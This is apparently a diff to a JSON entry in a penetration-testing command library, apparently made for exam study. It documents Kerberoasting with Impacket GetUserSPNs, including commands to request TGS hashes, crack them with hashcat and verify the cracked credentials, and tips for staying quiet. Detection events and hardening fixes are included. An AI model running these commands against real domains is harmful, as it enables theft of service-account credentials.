@@ -2,7 +2,7 @@
   "id": "ad-getuserspns-request",
   "name": "Impacket GetUserSPNs - Request TGS Hashes",
   "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -request -outputfile <outfile>",
-  "description": "Requests TGS-REP tickets for all SPN accounts and saves hashcat-ready hashes to file. The DC hands over encrypted tickets \u2014 the encryption IS the attack surface. Use -request-user <name> to target a single high-value account.",
+  "description": "Requests TGS-REP tickets for all SPN accounts and saves hashcat-ready hashes to file. The DC hands over encrypted tickets — the encryption IS the attack surface. Use -request-user <name> to target a single high-value account.",
   "platform": "linux",
   "type": "command",
   "opsec": "loud",
@@ -26,7 +26,7 @@
     "T1558.003"
   ],
   "exam": "exam-ok",
-  "notes": "=== WHAT THIS DOES MECHANICALLY ===\nGetUserSPNs.py -request does two things in one:\n  1. LDAP query to find all accounts with SPNs (same as list mode)\n  2. KDC request (AS-REQ + TGS-REQ) for each SPN found\n\nThe DC responds with a TGS ticket encrypted with the service account's NT hash.\nThe tool extracts the $krb5tgs$ encrypted blob and formats it for Hashcat.\n\n=== HASH FORMAT IN OUTPUT FILE ===\n  $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL...${hex}:${hex}\nThe $23$ means RC4 encryption (etype 23) \u2014 the crackable-faster mode.\nAES256 shows as $18$ and is MUCH slower to crack (mode 19700 vs 13100).\n\n=== TARGETED vs BULK ROASTING ===\n  -request            \u2192 roasts ALL SPN accounts (noisier; more Event 4769 logs)\n  -request-user NAME  \u2192 roasts one account (quieter; prioritize high-value targets)\n  Strategy: list first (-no -request), pick accounts with admincount=1 or\n  old PasswordLastSet, then roast just those with -request-user.\n\n=== ENCRYPTION TYPE MATTERS ===\nRC4 (etype 23, hashcat mode 13100)    \u2192 fast crack, default on older DCs\nAES256 (etype 18, hashcat mode 19700) \u2192 slow crack; preferred by newer DCs\nCheck encryption type: Get-DomainUser testspn -Properties msds-supportedencryptiontypes\nIf account supports RC4, you can force RC4 with Rubeus /rc4opsec flag.\n\n=== AFTER ROASTING ===\n  hashcat -m 13100 <outfile> /usr/share/wordlists/rockyou.txt\n  hashcat -m 13100 <outfile> /usr/share/wordlists/rockyou.txt -r best64.rule\nVerify cracked password: crackmapexec smb <dc_ip> -u sqldev -p database!\n\n=== DETECTION FOOTPRINT ===\nEvent ID 4769 (Kerberos TGS Request) \u2014 one per ticket requested\nKerberosRequestorSecurityToken type, encryption downgrade to RC4 = suspicious\nMany 4769s in short time for service accounts = Kerberoasting detected Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).",
+  "notes": "=== WHAT THIS DOES MECHANICALLY ===\nGetUserSPNs.py -request does two things in one:\n  1. LDAP query to find all accounts with SPNs (same as list mode)\n  2. KDC request (AS-REQ + TGS-REQ) for each SPN found\n\nThe DC responds with a TGS ticket encrypted with the service account's NT hash.\nThe tool extracts the $krb5tgs$ encrypted blob and formats it for Hashcat.\n\n=== HASH FORMAT IN OUTPUT FILE ===\n  $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL...${hex}:${hex}\nThe $23$ means RC4 encryption (etype 23) — the crackable-faster mode.\nAES256 shows as $18$ and is MUCH slower to crack (mode 19700 vs 13100).\n\n=== TARGETED vs BULK ROASTING ===\n  -request            → roasts ALL SPN accounts (noisier; more Event 4769 logs)\n  -request-user NAME  → roasts one account (quieter; prioritize high-value targets)\n  Strategy: list first (-no -request), pick accounts with admincount=1 or\n  old PasswordLastSet, then roast just those with -request-user.\n\n=== ENCRYPTION TYPE MATTERS ===\nRC4 (etype 23, hashcat mode 13100)    → fast crack, default on older DCs\nAES256 (etype 18, hashcat mode 19700) → slow crack; preferred by newer DCs\nCheck encryption type: Get-DomainUser testspn -Properties msds-supportedencryptiontypes\nIf account supports RC4, you can force RC4 with Rubeus /rc4opsec flag.\n\n=== AFTER ROASTING ===\n  hashcat -m 13100 <outfile> /usr/share/wordlists/rockyou.txt\n  hashcat -m 13100 <outfile> /usr/share/wordlists/rockyou.txt -r best64.rule\nVerify cracked password: crackmapexec smb <dc_ip> -u sqldev -p database!\n\n=== DETECTION FOOTPRINT ===\nEvent ID 4769 (Kerberos TGS Request) — one per ticket requested\nKerberosRequestorSecurityToken type, encryption downgrade to RC4 = suspicious\nMany 4769s in short time for service accounts = Kerberoasting detected Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).",
   "examples": [
     {
       "label": "Request all TGS tickets (bulk roast)",
@@ -41,7 +41,7 @@
       "command": "sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!"
     },
     {
-      "label": "Ch22 \u2014 request TGS for all SPNs as domain user (PEN-200 pattern)",
+      "label": "Ch22 — request TGS for all SPNs as domain user (PEN-200 pattern)",
       "command": "sudo impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<user>"
     }
   ],
@@ -71,7 +71,7 @@
     }
   ],
   "defense": {
-    "why_it_works": "impacket GetUserSPNs -request requests TGS tickets for SPN accounts from Linux and outputs their crackable hashes.",
+    "why_it_works": "Any authenticated user can request a Kerberos service ticket (TGS) for any SPN. The TGS is encrypted with the service account's password hash, so requesting it yields an offline-crackable blob without touching the service (Kerberoasting).",
     "prerequisites": "Valid domain credentials and network access to the DC.",
     "impact": "Crackable TGS hashes for the domain's service accounts.",
     "detection": "[MITRE T1558.003] Event 4769 (TGS requested) with RC4 encryption type (0x17) when AES is standard, or a burst of TGS requests for many SPNs from one source in a short window; a request for a honeypot SPN account is malicious by definition.",
@@ -82,11 +82,35 @@
       "HTB M13",
       "MITRE T1558.003"
     ],
-    "misconfiguration": "Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords \u2014 or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).",
-    "vulnerable_config": "# Service account set up manually with a weak password + SPN\n# Attacker can find these with:\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet\n\n# Bad state \u2014 password set 4 years ago, RC4 permitted:\n# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433\n# RC4 (0x17) requested in TGS ticket \u2014 short hash, GPU-crackable\n\n# Confirming RC4 is available:\nGet-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes\n# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)",
-    "secure_config": "# Fix 1 \u2014 Use Group Managed Service Accounts (gMSA): 240-char random passwords,\n# auto-rotated by AD, no human ever knows the password\nNew-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \\\n    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'\nInstall-ADServiceAccount gmsa_sql\n\n# Fix 2 \u2014 For legacy accounts that must keep SPNs:\n# Set a 100+ character random password (AD max is 127 chars):\n$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)\nSet-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)\n\n# Fix 3 \u2014 Disable RC4, require AES-only:\nSet-ADUser svc_sql -KerberosEncryptionType AES128,AES256\n# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)"
+    "misconfiguration": "Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords — or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).",
+    "vulnerable_config": "# Service account set up manually with a weak password + SPN\n# Attacker can find these with:\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet\n\n# Bad state — password set 4 years ago, RC4 permitted:\n# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433\n# RC4 (0x17) requested in TGS ticket — short hash, GPU-crackable\n\n# Confirming RC4 is available:\nGet-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes\n# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)",
+    "secure_config": "# Fix 1 — Use Group Managed Service Accounts (gMSA): 240-char random passwords,\n# auto-rotated by AD, no human ever knows the password\nNew-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \\\n    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'\nInstall-ADServiceAccount gmsa_sql\n\n# Fix 2 — For legacy accounts that must keep SPNs:\n# Set a 100+ character random password (AD max is 127 chars):\n$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)\nSet-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)\n\n# Fix 3 — Disable RC4, require AES-only:\nSet-ADUser svc_sql -KerberosEncryptionType AES128,AES256\n# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)"
   },
   "tools": [
     "impacket"
+  ],
+  "variations": [
+    {
+      "label": "Roast a single user",
+      "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password> -request-user <target> -outputfile hash.txt"
+    },
+    {
+      "label": "Pass-the-ticket",
+      "command": "GetUserSPNs.py -k -no-pass -dc-ip <dc_ip> <domain>/<user> -request -outputfile hashes.txt"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Request all TGS-REP hashes",
+      "command": "GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>:<password> -request -outputfile hashes.txt"
+    },
+    {
+      "label": "Crack offline (hashcat 13100)",
+      "command": "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"
+    },
+    {
+      "label": "Use the cracked service-account creds",
+      "command": "# check local admin / delegation for that account"
+    }
   ]
 }
